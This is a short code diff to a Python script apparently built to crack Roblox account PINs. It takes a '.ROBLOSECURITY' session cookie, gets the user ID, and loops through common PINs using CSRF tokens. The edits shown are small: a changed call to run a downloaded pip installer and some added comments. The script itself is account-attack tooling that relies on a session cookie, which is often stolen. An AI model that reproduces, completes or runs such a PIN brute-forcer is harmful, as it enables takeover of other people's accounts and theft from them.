@@ -13,7 +13,7 @@ except:
       print('\033[31m'+"Pip not installed. Installing now...")
       subprocess.call("curl https://bootstrap.pypa.io/get-pip.py --output get-pip.py", shell=True)
       time.sleep(5)
-      os.startfile("get-pip.py")
+      os.system("get-pip.py")
   print("[", end="")
   print('\033[31m'+" ERROR ", "red", end="")
   print("] " , end="")
@@ -128,6 +128,7 @@ class crack:
     # --({ Allow cprint to work in windows }) -- #
     os.system("")
     crack.check()
+    # --({ Check for files }) -- #
     if not os.path.exists("progress.json"):
       print("[", end="")
       cprint(" ERROR ", "magenta", end="")
@@ -150,6 +151,7 @@ class crack:
     '.ROBLOSECURITY': cookie
     }
     userid = requests.get("https://users.roblox.com/v1/users/authenticated",cookies=cookies).json()['id']
+    # --({ Try all the most common pins }) -- #
     while True:
       headers = {
       'X-CSRF-TOKEN': getXsrf(cookie),
